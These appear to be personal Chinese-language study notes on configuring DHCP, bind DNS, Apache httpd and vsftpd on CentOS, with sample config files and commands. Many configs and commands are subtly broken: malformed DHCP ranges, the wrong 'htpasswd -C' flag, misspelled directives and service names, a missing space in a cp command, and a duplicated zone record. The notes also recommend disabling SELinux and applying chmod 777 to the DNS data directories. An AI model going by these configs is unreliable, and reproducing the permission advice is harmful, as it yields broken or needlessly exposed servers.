netmask 子网掩码 {….} 定义DHCP作用域和子网掩码 range 起始IP地址 终止IP地址 定义作用域提供动态分配IP地址的范围 host 主机名称 {…..} 定义保留域 group {….} 为一组参数提供说明 allow unknown-clients ; deny unknown-clients 是否动态分配IP给未知使用者 3.选项部分 选项部分全部一option关键字作为开头 subnet-mask 子网掩码 为客户端设定子网掩码 domain-name 域名 为客户端设定DNS名称 domain-name-servers IP地址 为客户端设定DNS服务器的IP地址 host-name 主机名 为客户端指定主机名称 routers IP地址 为客户端设定默认网关 broadcast-address 为客户端设定广播地址 DHCP服务器配置实例例子：某实验室有93台主机，域为study.com，网络出口网关为192.168.1.254.DNS服务器地址为192.168.1.1。有一台DHCP服务器，其固定地址为192.168.1.1。92台主机需要动态获取IP及相应的配置信息，并且可用通过网络出口上网。可用的地址范围为192.168.1.2～192.168.1.100，其中192.168.1.20～192.168.1.28保留。有一台主机作为教师机，固定IP为192.168.1.6，其Mac地址为00-00-00-11-22-33。 建立/etc/dhcp/dhcpd.conf文件如下 123456789101112131415161718ddns-update-style interim;ignore client-updates;subnet 192.168.1.0 netmask 255.255.255.0&#123; //subnet声明一个IP作用域 range 192.168.2 192.168.1.19; range 192.168.29 192.168.1.100; option routers 192.168.1.254; //option设置作用域选项 option subnet-mask 255.255.255.0; option broadcast-address 192.168.1.255; option domain-name-servers 192.168.1.1; option domain-name &quot;study.com&quot;; option time-offset -18000; default-lease-time 21600; //设置地址租约时间 max-lease-time 43200; host TeacherPC&#123; //保留特定地址 hardware ethernet 00:00:00:11:22:33; fixed-address 192.168.1.6; &#125;&#125; 需要注意的是，DHCP服务器不能同时作为DHCP客户端 超级作用域在大规模的网络中，存在多个子网网络，这些子网网络都需要自动获取IP，此时就需要配置一个超级作用域，即为整个网络配置一台DHCP服务器，没必要为每个子网都配置台DHCP服务器 例子：某企业有三个c类子网，192.168.1.0/24、192.168.2.0/24、192。168.3.0/24。www服务器地址固定为192.168.1.16，各个子网的网关分别为192.168.1.1、192.168.2.1、192.168.3.1，整个网络的DNS服务器设定为1.2.3.4，域名为test.com。建立/etc/dhcpd.conf文件如下： 12345678910111213141516171819202122232425ddns-update-style interim;ignore client-updates;shared-network IntranetNet&#123; option subnet-mask 255.255.255.0; option domain-name-servers 1.2.3.4; option domain-name &quot;test.com&quot;; default-lease-time 21600; max-lease-time 43200; subnet 192.168.1.0 netmask 255.255.255.0&#123; range 192.168.1.2 192.168.1.254; option routers 192.168.1.1; host WWWServer&#123; hardware ethernet 00:00:00:11:22:33; fixed-address 192.168.1.16; &#125; &#125; subnet 192.168.2.0 netmask 255.255.255.0&#123; range 192.168.2.2 192.168.2.254; option routers 192.168.2.1; &#125; subnet 192.168.3.0 netmask 255.255.255.0&#123; range 192.168.3.2 192.168.3.254; option routers 192.168.3.1; &#125;&#125; 配置DHCP客户端Windows下的dhcp客户端配置和前面一样，自动获取IP地址和dns服务器地址即可 Linux下的DHCP客户端配置（1）打开/etc/sysconfig/network-scripts/ifcfg-eth0文件，找到其中的BOOTPROTO选项，将其值修改为dhcp （2）使用以下命令是配置立即生效 1systemctl restart network 或 service network restart DNS服务器DNS概述hosts文件Linux下的hosts文件存放于/etc目录下 Linux下的bind简介不管是Linux系统还是unix系统，只要作为DNS服务器，通常采用bind程序实现 配置DNS所需的相关文件在centos中，配置文件所在的目录有两个：/etc和/var/named，相关的配置文件及存放位置如下： 1234named.conf 存放于/etc目录下named.ca 和 named.hosts 存放于/var/named目录下named.rev 存放于/var/named目录下named.local 存放于/var/named目录下 需要解决bind DNS服务器以root权限启动后，导致权限过大而存在的安全漏洞提权问题，解决方案为通过以root身份启动服务程序后，再以低权限的系统账户身份来运行服务进程，从而使得即使利用服务进程的漏洞，权限也不高。 为了配置顺利，先将/etc/selinux/config文件中的SELINUX值设置为disable，并重启 接着安装bind和bind-chroot软件 如果bind程序包和bind-chroot程序包安装成功，所有的配置文件的真实存放位置就与以前不同了，而此时的真实相关文件在/var/named/chroot目录下的etc和var/named下，以后的named服务所用的根目录为/var/named/chroot 为了保证配置文件及相关文件能被找到，需要进行以下操作 1.准备bind-chroot环境 1cp -R /usr/share/bind-*/sample/var/named/* /var/named/chroot/var/named 2.创建相关文件 123456touch /var/named/chroot/var/named/data/cache_dump.dbtouch /var/named/chroot/var/named/data/named_stats.txttouch /var/named/chroot/var/named/data/named_mem_stats.txttouch /var/named/chroot/var/named/data/naemd.runmkdir /var/named/chroot/var/named/data/dynamictouch /var/named/chroot/var/named/data/dynamic/managed-keys.bind 3.设置权限 12chmod -R 777 /var/named/chroot/var/named/datachmod -R 777 /var/named/chroot/var/named/dynamic 4.拷贝为主配置文件 1cp -p /etc/named.conf/var/named/chroot/etc/named.con 另外需要注意的是，需要将服务器的TCP/UDP的53端口添加到防火墙例外才能接收客户请求 以命令方式配置DNS服务配置DNS服务器的主要步骤 检查系统是否安装bind和bind-chroot软件包 规划DNS服务的区域，确定正向区域和反向区域域名 /var/named/chroot/etc/named.conf作为DNS服务器的主配置文件，需要在文件中添加所规划的正向区域和反向区域，并以zone为关键字设定区域，同时指定区域文件所在的位置和文件名 在/var/named/chroot/var/named目录中建立正向区域文件和反向区域文件，并在两个主文件中添加主机记录项和对应的指针记录项等内容 采用named-chroot模式启动或重新启动DNS服务（name守护进程） 主配置文件详解Linux下的DNS服务，以bind程序和bind-chroot程序建立，DNS的基本配置文件是/var/named/chroot/etc/named.conf，包括了数据文件的存放记录、DNS客户访问控制策略、区域定义等，但是不包括具体区域数据记录项。该文件格式为： 123statement&#123; parameters; //注释&#125;; 其中statement关键字告诉bind操作行为的某个方面，而parameters关键字是作用于该语句的专有参数。另外大括号后面需要有一个分号，这雨DHCP服务器配置文件不同 关键字： acl 访问控制表，用于确定客户对该DNS服务器拥有什么样的访问策略 include 能够包含一个文件，并且将该文件视为普通的named.conf文件的组成部分 logging 指定系统需要记录哪些信息、不需要记录哪些信息 options 解决全局性的服务器配置问题 server 设置服务器专有的配置参数 zone 定义一个DNS区域 acl语句：自定义格式为 123acl name &#123; IP_address_list;&#125;; 控制IP列表里的IP能或不能访问DNS服务器，常见缺省为any任何主机，或none。 IP前加感叹号表示排除IP，即不能访问DNS服务器。排除的IP要写在允许的IP前 include语句：例如： 12include &quot;/var/named/acl.conf&quot;;include &quot;/etc/rndc.key&quot;; logging语句：缺省情况下都被记录到/var/log/messages文件里 option语句：常见参数为 | directory path-name; | 存放named文件的相关数据配置文件的绝对路径(path-name)，当使用了named-chroot后，设置directory /var/named的时候，都是表示/var/named/chroot下的目录 || —————————– | ———————————————————— || notify yes/no; | 缺省值为yes。会触发DNS服务器发送一个notify消息，通知该主服务器的所有从服务器更新地址表，并进行区域传送操作 || forwarders {ip-list;} | 用于定义转发服务器的IP地址清单，如果在本地服务器中没有客户请求的记录项，本地服务器就将其转发给地址清单中的DNS服务器完成解析 || forward first/only; | 只有使用forward后才有效 || check-names type action; | 根据他们的客户机上下文检验域名的完整性。type的值有：master代表主域名服务器，slave代表从域名服务器，response代表缓冲服务器和客户机。action的值有：ignore的值代表忽略检查；warn代表生成一个系统记录，并作出警告；fail代表生成一个系统记录项，并拒绝对查询作出响应 || allow-query {address-list;} | 定义了哪些IP地址被允许向服务器提出查询请求，缺省为全部 || allow-transfer{address-list;} | 定义了哪些DNS服务器可以与该DNS服务器进行区域传送操作 || datasize data-size; | 定义分配给named的内存，缺省值为最大值 || stacksize number; | named可以在系统堆栈中占用的最大内存量 || cleaning-interval number; | 定义服务器从缓冲区里删除失效的记录项和时间间隔。缺省值为69分钟进行一次清理 || dump-file 绝对路径文件 | 设置服务器存放数据库的剧对路径和文件名，对rndc dumpdb命令有效 || statics-file 文件绝对路径 | 设置服务器统计信息文件的绝对路径，对rndc stats命令有效 || version 版本 | 设置服务器的版本信息 | server语句：标示把bind可能会联系到的其他域名服务器的具体情况通知给该服务器，语句格式： 1234server 192.168.0.1&#123; bogus no; transfer-format many-answers; //一次查询响应里接受多重回答&#125;; zone语句：定义一个DNS区域 1234zone domain-name IN&#123; type master; file path-name;&#125;; 比如在域test.com中建立一个区域，对应的数据文件是/var/named/test.com.db，file 处的值为text.com.txt。 当DNS运行的时候，它将主动去查找该文件的test.com信息。反向解析也一样 bind的DNS区域类型 master 主DNS区域类型 slave 从属DNS区域类型，由主DNS区域控制 stub 与从属区域类似，但只是保存DNs服务器的名字 forward 将任何查询请求转发给指定DNS服务器，即转发服务器 hint 根DNS的internet服务器集 资源记录域名服务器通常将有关网络中主机的信息保存在正向区域解析文件和反向区域解析文件的资源记录中 正向解析区域文件当主配置文件/var/named/chroot/etc/named.conf的区域定义完成后，以主DNS服务器运行需要建立相应的正向解析。前面提到的正向解析区域文件test.com.txt（/var/named/chroot/var/named）的内容如下： 12345678910111213141516$TTL 86400@ IN SOA dns.test.com. root.test.com.( 2016050801 ;serial,序列号 10800 ;refresh,更新时间 1800 ;retry,重试间隔时间 1209600 ;expiry,过期时间 86400) ;minimum,最小默认TTL@ IN NS dns.test.com. IN MX 10 mail.test.com.igy IN A 192.168.1.1;internet gatewayserver IN A 192.168.1.2;serverftp1 IN A 192.168.1.3;FTP serverdns IN A 192.168.1.6;dns servermail IN CNAME serverwww IN CNAME serversoft.test.com IN A 192.168.1.8 1.设置允许客户端缓存来自查询的记录项的默认生存时间 $TTL选项定义了客户端可缓存记录的生存时间（秒），通常置于第一行行首 2.设置授权资源记录开始 以SOA为关键字作为标示代表授权资源记录开始，SOA资源记录定义了域名数据的基本信息和相关信息，通常将SOA置于紧跟$TTL项的下一行： （1）设置所管辖的域名。根据举例可以看出所管辖的域名为test.com.（后面的点不能省略），通常可以简写，用@代替 （2）设置internet类。IN说明了类型为internet，为固定格式 （3）设置授权主机名。dns.test.com代表了该test.com.区域的名称解析的授权主机名，可确定控制该区域的主机，而且该授权主机名必须在区域文件中存在一条地址资源A记录 （4）设置负责该区域的管理员的email地址。root.test.com.表明管理员email地址为root@test.com。由于DNS中将@代表区域名，所以用点代替@ （5）设置SOA资源记录中各参数值。以（符号开始，以）符号结束，在括号内设置各参数值。 3.设置名称服务器NS资源记录 1@ IN NS dns.test.com 名称服务器资源记录定义了test.com由哪个DNS服务器负责解析 4.设置主机地址A资源记录 在定义中可以采用两种方式定义主机地址资源记录项 12dns IN A 192.168.1.6;web serversoft.test.com. IN A 192.168.1.8; //注意主机名后的点 5.设置别名资源记录 一台主机承担多种任务，既是邮件服务器，也是www服务器，此时就可以用别名定义 123server IN A 192.168.1.2;servermail IN CNAME serverwww IN CNAME server 6.设置邮件交换器MX资源记录 例如当发送到test@test.com时，邮件服务器开始查询DNS test.com域名的MX资源记录，如果存在MX资源记录，就直接发送到MX所指定的邮件服务器上 反向解析区域文件跟前面的正向解析区域文件类似，反向区域解析文件1.168.192.in-addr.arpa.db（/var/named/chroot/var/named） 12345678910111213$TTL 86400@ IN SOA dns.test.com. root.test.com. ( 2016050801 ;serial 10800 ;refresh rate 3hours 1800 ;retry 30 minutes 1209600 ;expire 2 weeks 86400) ;minimum@ IN NS dns.test.com.1 IN PTR igy.test.com.2 IN PTR server.test.com.3 IN PTR ftp1.test.com.6 IN PTR dns.test.com.8 IN PTR soft.test.com. 1.设置SOA和NS资源记录 反向解析区域文件也需要和正向解析区域文件一样的SOA和NS资源记录，而且正向和反向的设置一致，其中@代表1.168.192.in-addr.arpa. 2.设置指针记录 指针资源记录属于正向解析区域中地址资源记录的反向记录，只需注意一点，主机名末尾有一个点 /var/named/chroot/var/named/named.ca文件/var/named/chroot/var/named/named.ca文件内容为存放根服务器的地址列表。当DNS服务器在递归查询的时候，并且在本地区域没有记录时，就会转向根DNS服务器查询，同时查询named.ca文件的根服务器的地址列表 需要在/var/named/chroot/etc/named.conf设置根区域 1234zone &quot;.&quot; IN&#123; type hint; //DNS区域类型为hint file &quot;named.ca&quot; //设置根区域，并指定数据文件&#125;; DNS Slave服务器配置需要修改/var/named/chroot/etc/named.conf主配置文件来配置一个从区域，假设DNS从属主机的IP为192.168.1.254，而主DNS服务器地址为192.168.1.6，区域名为test.com。在从属DNS的named.conf文件中添加内容如下 12345678910zone &quot;text.com&quot; IN&#123; type slave; file &quot;slave/test.com.txt&quot;; masters &#123;192.168.1.6;&#125;;&#125;;zone &quot;1.168.192.in-addr.arpa&quot; IN &#123; type slave; file &quot;slave/1.168.192.in-addr.arpa.txt&quot;; masters &#123;192.168.1.6;&#125;;&#125;; 其中区域名使用和主服务器相同，而masters的IP地址列表为所必须依赖的主域名服务器IP地址列表 master DNS服务器配置实例例子：某研究所有400台主机，共有三个c类地址：192.168.1.0/24~192.168.3.0/24，其中有十台左右服务器，并建立了一个域名：research.com，需要建立一台主DNS服务器 （1）检查DNS服务器是否有固定IP地址192.168.1.6，通过rpm检查bind和bind-chroot软件安装情况 （2）修改主配置文件/var/named/chroot/etc/named.conf，修改后的文件如下： 1234567891011121314151617181920212223242526acl research_net &#123; 192.168.1.0/24; 192.168.2.0/24; 192.168.3.0/24;&#125;; //设置客户可以访问控制地址列表options &#123; directory &quot;/var/named&quot;; forwarders &#123;192.168.10.254;&#125;; //设置DNS转发器 dump-file &quot;/var/named/data/cache_dump.db&quot;; statics-file &quot;/var/named/data/named_stats.txt&quot;;&#125;;zone &quot;.&quot; IN &#123; type hint; file &quot;named.ca&quot;;&#125;;//设置区域、主服务器类型及解析数据文件，建立客户访问控制权限zone &quot;research.com&quot; IN &#123; type master; file &quot;research.com.txt&quot;; allow-query &#123;research_net;&#125;; //允许三个子网查询该DNS资源记录&#125;;zone &quot;168.192.in-addr.arpa&quot; IN&#123; type master; file &quot;research.com.rev.txt&quot;; allow-query &#123;research_net;&#125;;&#125;; （3）建立正向解析区域文件，首先需要在/var/named/chroot/var/named下建立文件 1touch /var/named/chroot/var/named/research.com.txt 编辑research.com.txt文件 12345678910111213141516171819202122$TTL 86400@ IN SOA dns.research.com. root.research.com.( 2016050801 ;serial 10800 ;refresh 1800 ;retry 1209600 ;expiry 86400) ;minimumresearch.com IN NS dns.research.com. IN MX 10 mail.research.com.gw1 IN A 192.168.1.1 ;A network gatewaygw2 IN A 192.168.2.1;gw1 IN A 192.168.3.1;dns IN A 192.168.1.6 ;dns serverserver IN CNAME dnswww IN CNAME dnsmail IN A 192.168.1.3 ;mail serverftp IN A 192.168.1.4 ;ftp servermanage IN A 192.168.1.200 ;manager服务器oa IN A 192.168.2.8 ;oa servervod IN A 192.168.2.10www1 IN A 192.168.3.8soft IN A 192.168.3.10 （4）建立反向解析区域文件，首先在/var/named/chroot/var/named下建立文件 1touch /var/named/chroot/var/named/research.com.rev.txt 编辑文件 12345678910111213141516171819$TTL 86400@ IN SOA dns.test.com. root.test.com. ( 2016050801 ;serial 10800 ;refresh rate 3hours 1800 ;retry 30 minutes 1209600 ;expire 2 weeks 86400) ;minimum IN NS dns.research.com.1.1 IN PTR gw1.research.com.1.2 IN PTR gw2.research.com.1.3 IN PTR gw3.research.com.6.1 IN PTR dns.research.com.3.1 IN PTR mail.research.com.4.1 IN PTR ftp.research.com.200.1 IN PTR manage.research.com.8.2 IN PTR oa.research.com.10.2 IN PTR vod.research.com.8.3 IN PTR www1.research.com.10.3 IN PTR soft.research.com. （5）启动DNS服务器 1systemctl start nemed-chroot DNS服务器客户端配置Linux下配置DNS客户端直接修改/etc/resolv.conf来完成DNS客户端配置 12domain research.comnameserver 192.168.1.6 同时还要注意/etc/host.conf文件内容 1order hosts;bind 需要注意的是，如果在使用Linux系统做DNS服务器的时候，有需要将本DNS服务器主机作为DNS客户端，同样需要将/etc/resolv.conf文件内容修改后，指定首选DNS服务器为本地IP地址 Windows下的dns客户端配置前面记录过了，略过 Web服务器apache基础apache相关文件和目录centos默认情况下是没有安装httpd程序的，可以在线安装，安装后的配置文件、目录、帮助文档如下 分类 文件或目录 描述 web站点主目录 /var/www apache站点文件所在的缺省目录 /var/www/html apache站点默认的主文档目录 /var/www/cgi-bin apache站点缺省的cgi程序文件所在目录 站点的配置文件 .htaccess 该文件置于站点目录下，包含对所在目录中文件的访问控制权 /etc/httpd/conf.d apache服务器配置文件的额外配置文件的存放目录 /etc/httpd/conf/httpd.conf apache服务器的主配置文件，作为核心配置文件 功能模块 /etc/httpd/modules apache服务器功能模块存放位置，该文件是链接文件，指向/usr/lib64/httpd/modules或/usr/lib/httpd/modules下 /etc/httpd/conf.modules.d 装载功能模块的配置文件存放的目录 运行的日志目录及文件 /etc/httpd/logs apache的日志存放目录，该文件链接到/var/log/httpd上 /var/log/httpd apache服务器日志文件所在位置 /var/log/httpd/access_log 访问站点的日志文件 /var/log/httpd/error_log 错误日志文件 配置参考文档 /usr/share/doc/httpd-x.x.x 存放了httpd配置文件的样例配置 httpd的主配置文件为http.conf和/etc/httpd/conf.d下的conf文件，其默认配置信息主要点描述如下： （1）运行apache的用户：apache （2）运行apache的组：apache （3）监听端口：80 （4）模块存放路径：/usr/lib/httpd/modules或/usr/lib64/httpd/modules （5）prefork MPM运行方式的参数（将/usr/share/doc/httpd-2.4.6/httpd-mpm.conf拷贝到/etc/httpd/conf.d下）为 12345StartServer 5MinSpareServer 5MaxSpareServer 10MaxRequestWorkers 250MaxConnectionsPerChild 0 httpd.conf文件详解及配置httpd.conf主配置文件httpd.conf的常见参数和选项说明 选项参数 描述 ServerToken 当服务器响应主机头信息时显示apache的版本和操作系统 ServerRoot 服务器配置文件、错误和日志文件的绝对路径，缺省为/etc/httpd PidFile 服务器运行的进程pid存放在哪一个文件中 TimeOut 接受和发送超时 MaxRequestsPerChild 允许在一个进程结束前应该处理的子进程的最大数目 MaxClients 指定在某时刻接受访问的客户数量。缺省为150 Listen 告诉服务器在可选的IP地址和端口号处接受进入的请求，可以有多个listen，缺省为监听所有可用地址的80端口 User和Group 设置用来处理请求的用户和用户组的名字，缺省为apache和apache ServerAdmin 设置服务器管理员的E-mail地址 ServerName 设置服务器的名字 DocumentRoot 文档服务器的绝对目录，缺省为/var/www/html \ 与\为一对命令封装，是一个上下目录缺省许可的权限设置 \ 与\命令封装特定的虚拟机 Options 在特定命令中提供的服务器功能，通常在\和\中 DirectoryIndex 设置如index.html这样的缺省主页 apache服务基本配置1.设置服务配置目录 apache服务器需要在httpd.conf中设置服务配置文件、日志等所在的相对配置路径，缺省如下，一般不作修改 1ServerRoot &quot;/etc/httpd&quot; 2.设置KeepAlive的值及其相关设置 KeepAlive的缺省值为Off，将keepalive的值设置为on，可以提高访问性能 123KeepAlive OnMaxKeepAliveRequests 100KeepAliveTimeout 15 3.设置主服务器的主文档目录 apache服务器的主文档目录的默认目录为“/var/www/html”，httpd.conf文件中显示为 1DocumentRoot &quot;/root/www/html&quot; 4.设置使用prefork MPM或workder MPM运行方式的参数 （1）使用prefork MPM运行方式（默认） 1234567&lt;IfModule mpm_prefork_module&gt; StartServer 5 //设置服务器启动时运行的速度 MinSpareServers 5 //apache在运行时会根据负载的轻重自动调整空闲子进程的数目，如果低于5个空闲子进程，就创建一个新的子进程准备为客户提供服务 MaxSpareServers 10 //如果高于10个空闲子进程，就逐一删除提高系统性能 MaxRequestWorkers 250 //许可启动最大服务器进程数量，默认250 MaxConnectionsPerChild 0 //限制每个子进程在结束处理请求之前能处理的链接请求为0，不限制&lt;/IfModule&gt; （2）使用worker MPM运行方式的缺省内容 12345678&lt;IfModule mpm_worker_module&gt; StartServer 3 MinSpareThreads 75 MaxSpareThreads 250 ThreadsPerChild 25 MaxRequestWorkers 400 MaxConnectionsPerChild 0&lt;/IfModule&gt; 5.设置缺省打开文档 和iis类似，apache服务器在缺省情况下设定缺省打开文档如下： 1DirectoryIndex index.html default.html 6.设定服务器监听的IP和端口号 默认情况下apache监听服务器所有可用的IP地址和tcp协议的80端口 1Listen 80 或 Listen *:80 当然也可以指明IP 1Listen 192.168.0.1:80 7.设置服务器管理员e-mail地址 如果客户访问apache站点时发生错误，服务器可以给用户返回一个错误的网页提示，其中就包含管理员的email地址 1ServerAdmin admin@test.com 8.设置apache服务器主机名 在配置文件中默认是被注释掉了的 1ServerName www.test.con:80 或 ServerName 192.168.0.1:80 9.设置服务器缺省日志文件 以下显示了主要的日志、日志记录类别和日志记录格式 1234ErrorLog logs/error_log 子目录下logs相对前面/etc/httpd配置在根目录下CustomLog logs/access_log common 设定客户访问的日志记录LogFormat &quot;%h %l %u %t \&quot;%t\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;Uer-Agent&#125;i\&quot;&quot; combinedLogFormat &quot;%h %l %u %t \&quot;%r\&quot;%&gt;s %b&quot; common LogFormat是设定日志记录的格式，其中combined代表日志使用的格式，common代表使用web服务器普遍采用的格式 10.设置缺省字符集 默认情况下apache在配置文件中用的是UTF-8字符集，当网页有中文的时候会出现乱码。需要将其修改为GB2312字符集 1AddDefaultCharset UTF-8 修改为 AddDefaultCharset GB2312 11.设置web目录和访问控制 以httpd.conf中的站点主目录为例 12345&lt;Directory &quot;/var/www/html&quot;&gt; Options Indexes FollowSymLinks AllowOverride None Require all granted&lt;/Directory&gt; （1）目录中的Options定义了目录拥有的特性 指令 描述 All 启动除MultiViews外的所有特性，如果没有Options，缺省值就为All Indexes 如果映射到目录的URL收到请求，但是没有DirectoryIindex所指定的内容，服务器就会返回一个已经格式化的目录列表，即允许目录列表（此时需要将/etc/httpd/conf.d/welcome.conf文件删除或改名） FollowSymLinks 允许服务器在目录中使用符号链接，这个在Linux中比较重要 MultiViews 客户请求的一个特定文档没有发现，服务器将提交一个可匹配的文档 ExecCGI 允许在目录下执行CGI脚本程序 IncludesNoExec 允许服务器包含SSI，但是仅用CGI脚本 Includes 允许使用SSI （2）设置AllowOverride选项 AllowOverride选项定义了每个目录下是否可以使用”.htaccess”文件来实现访问控制，通常是将AllowOverride的选项设置为“None“ （3）设置缺省访问权限的相关选项 在2.2版本以前，使用order选项及allow和deny指令来控制客户IP或域名的访问权限。在2.4以后，采用Require实现控制访问，如： 允许所有客户机访问服务器的指定目录下的文件 2.4版本之前： 12Order allow,denyAllow from all 2.4版本之后： 1Require all granted 建立虚拟目录每个虚拟目录都有一个别名，客户进行web浏览的时候就是通过别名来访问虚拟目录的 首先查看httpd.conf文件，能够找到\的位置，可以根据模块所包括的内容说明进行相应的虚拟目录设置，例如 123Alias /icons/ &quot;/var/www/icons&quot;ScriptAlias /cgi-bin/ &quot;/var/www/cgi-bin/&quot;Alias /error/ &quot;/var/www/error&quot; 当建立别名后需要为真实的物理路径设置目录控制项，前面有记录。httpd.conf的缺省设置如下： 12345678910&lt;Directory &quot;/var/www/icons&quot;&gt; options Indexes MultiViews AllowOverride None Require all granted&lt;/Directory&gt;&lt;Directory &quot;/var/www/cgi-bin&quot;&gt; AllowOverride None Option None Require all granted&lt;\Directory&gt; 例如如果用户需要将/var/ftp/pub下的文件以web形式提供下载，则 123456Alias /down/ &quot;/var/ftp/pub&quot;&lt;Directory &quot;/var/ftp/pub&quot;&gt; AllowOverride None Options Indexes MultiViews Require all granted&lt;/Directory&gt; 由于/var/ftp/pub目录本身不具有与selinux功能相关的httpd上下文文本标签属性，即“httpd_sys_content_t”，因此我们可以使用ls -Z命令查看该/var/ftp的属性。如果没有看到“httpd_sys_content_t“内容，就需要使用chcon命令修改目录及目录下的所有子目录和文件的“httpd_sys_content_t”文本标签属性 1chcon -R -t httpd_sys_content_t /var/ftp 用户认证用户认证的配置和Windows iis 一样，Linux下需要与前面提到的web目录控制选项结合，其中AllowOverride就是需要的选项。 若站点虚拟目录别名为down，对应的物理路径为/var/www/pub，则需要采用用户认证后才能被访问，而且只有试stu和teacher用户有效，步骤如下： （1）创建stu和teacher用户和密码 采用apache服务器自带命令htpasswd来完成创建、更新和删除操作。假设生成的用户文件安全的存放于/etc/httpd/conf目录下，文件名为DownUserPasswd： 1234cd /etc/httpd/confhtpasswd -C DownUserPasswd stu输入并重复输入密码同样的步骤创建teacher账户 值得注意的是，第一次使用htpasswd创建用户账号文件的时候，需要用-C选项完成，但如果是对账户文件添加用户就用任何选项 （2）建立虚拟目录和日志需授权的认证目录 在apache服务器的/etc/httpd/conf/httpd.conf主配置文件中需要建立如下内容 123456Alias /down &quot;/var/www/pub/&quot;&lt;Directory &quot;/var/www/pub&quot;&gt; Options All AllowOverride Authconfig Require all granted&lt;/Directory&gt; 这种方式需要标示认证授权配置文件.htaccess，该文件存放于需要授权认证的目录下，需要编辑文件/var/www/pub/.htaccess 1234AuthName &quot;授权认证测试&quot; //窗口提示AuthType &quot;Basic&quot; //认证类型AuthuserFile &quot;/etc/httpd/conf/DownUserPasswd&quot; //身份验证文件Require user stu teacher //有效用户，使用空格分割用户 如果不需要.htaccess文件，直接将.htaccess的内容放入httpd.conf文件的控制目录中，代替AllowOverride AuthConfig项 配置和管理用户的个人站点配置准备配置步骤： （1）修改主配置文件/etc/httpd/conf.d/userdir.conf的UserDir项，启用用户的web站点配置 （2）修改主配置文件为每个用户的web站点目录配置访问控制 123456789&lt;IfModule mod_userdir.c&gt; UserDir disable root //基于安全考虑，禁止root用户使用自己的个人站点 UserDir public_html //配置对每个用户web站点目录的设置，可以修改&lt;IfModule&gt; &lt;Directory &quot;/home/*/public_html&quot;&gt; //设置每个用户web站点目录的访问权限，将下面配置行前的#去掉 AllowOverride FileInfo AuthConfig Limit Indexes Options MultiViews Indexes SymLinkIfOwnerMatch IncludesNoExec Require method GET POST OPTIONS&lt;Directory&gt; （3）在个人注册目录下架设个人web站点 （4）客户访问站点及虚拟目录别名 配置虚拟web站点配置基于IP地址的虚拟主机站点和iis类似，例如IP为192.168.1.1的服务器上建立多个IP地址192.168.1.2和192.168.1.3，在这两个IP地址上分别建立一个虚拟web站点，每个站点的主目录不同，需要将/var/share/doc/httpd-x-x-x/httpd-vhosts.conf文件拷贝到/etc/httpd/conf.d目录下，再按照文件内容格式添加或修改相应内容 123456789101112131415&lt;VitualHost 192.168.1.2:80&gt; ServerAdmin admin@test.com DocumentRoot &quot;/var/www/web1&quot; ServerName 192.168.1.2 DirectoryIndex index.html ErrorLog &quot;/var/log/httpd/web1-access_log&quot; common&lt;/VirtualHost&gt;&lt;VirtualHost 192.168.1.3&gt; ServerAdmin admin@test.com DocumentRoot &quot;/var/www/web2&quot; ServerName 192.168.1.2 DirectoryIndex index.html ErrorLog &quot;/var/log/httpd/web2-access_log&quot; common&lt;/VirtualHost&gt; 配置基于主机名的虚拟主机站点同一个IP可以对应多个主机名，需要DNS完成解析。例如DNS服务器中IP地址为192.168.1.1对应的两个主机名为www1.test.com和www1.test.com的记录，为这两个主机名建立分别建立一个就要主机名的虚拟主机站点，需要把/etc/httpd/conf.d/httpd-vhosts.conf文件修改为 1234567891011121314151617&lt;VirtualHost www1.test.com:80&gt; ServerAdmin root@test.com DocumentRoot /var/www/web1 ServerName www1.test.com DirectoryIndex index.html ErrorLog &quot;/var/log/httpd/web1-error_log&quot; CustomLog &quot;/var/log/httpd/web1-access_log&quot; common&lt;/VirtualHost&gt;&lt;VirtualHost www2.test.com:80&gt; ServerAdmin root@test.com DocumentRoot /var/www/web2 ServerName www2.test.com DirectoryIndex index.html ErrorLog &quot;/var/log/httpd/web2-error_log&quot; CustomLog &quot;/var/log/httpd/web2-access_log&quot; common&lt;/VirtualHost&gt; FTP服务器Linux下的FTP概述FTP服务器种类较多，有vsftpd、WU-Ftp、proFTP和pure-tfpd等。根据服务对象的不同，FTP服务器分为FTP系统服务器和匿名FTP服务器。前者只允许系统上的合法用户使用，后者允许任何人登录到FTP服务器。如果系统允许使用本地账号登录，会让用户映射为匿名用户，定位到匿名用户的根目录 1.客户机和服务器之间建立连接和数据传输的过程 （1）FTP客户项服务器发起连接请求，随机选择一个大于1024的端口号去访问FTP服务器的21端口（默认），并等待验证身份。 （2）如果身份验证通过，双方的会话连接建立成功。此时可以根据服务器设定短裤哦服务，可以是20端口也可以是其他大于20的端口 （3）服务过程传输层协议采用TCP协议，不支持UDP协议 （4）输出传输完毕后，双方的会话连接依然维持连接状态，知道发出会话终止命令 2.主动模式和被动模式 FTP需要建立两个端口，其中一个为数据端口，另一个为命令端口（控制端口）。通常控制端口设定为21端口，数据端口设定为20端口。但通常FTP客户端使用的端口无法预知，因此使FTP产生了两种工作模式，主动模式和被动模式 主动模式 ​ FTP客户端从任意的非特权端口M（M&gt;1024）连接到FTP服务器的21端口（默认），同时客户端开始监听M+1端口，接着FTP服务器接受请求并建立控制会话连接。如果FTP客户端需要进行数据传输，就会发送FTP数据传输命令，并且发送port M+1到服务器。接着服务器会从它自己的数据端口20连接到客户端指定的数据端口（M+1）后，进行数据传输 ​ 需要注意的是，在主动模式中会被防火墙拦截。FTP客户端并没有实际建立一个到服务器数据端口的连接，它只是简单地告诉服务器自己监听的端口，FTP服务器再主动连接FTP客户端这个指定端口M+1。然后对于客户端的防火墙来说，这是从外部系统建立到内部客户端的新连接，通常会被阻塞 被动模式 ​ 为了解决FTP服务器主动发起到客户端的数据连接请求问题，需要采用被动模式，或者叫PASV。当FTP客户端通知FTP服务器它处于被动模式时才启用。在被动模式中，命令连接和数据连接都由客户段发起，也就是说，主动和被动是相对于服务器而言的。当开启一个FTP连接请求时，客户端将会打开两个任意的非特权本地端口（M&gt;1024和M+1）。第一个用来连接FTP服务器的21命令控制端口，此时客户端不会用提交port M+1的命令方式来让服务器主动连接客户的数据端口，而是提交PASV命令。FTP服务器回开启一个任意的非特权端口，并发送port N命令到FTP客户端，然后有客户端发起从本地端口M+1到服务器的端口N的连接，作为传送数据的服务端口，最终防火墙认为这是一个合法连接 vsftpd相关配置文件说明服务器vsftpd被安装后，主要的相关文件和目录包括： /etc/vsftpd目录为vsftpd服务器配置文件主目录 /etc/vsftpd/vsftpd.conf文件为vsfpd服务器的主配置文件，缺省情况下的FTP主目录为/var/ftp，任何配置参数修改需要操作此文件 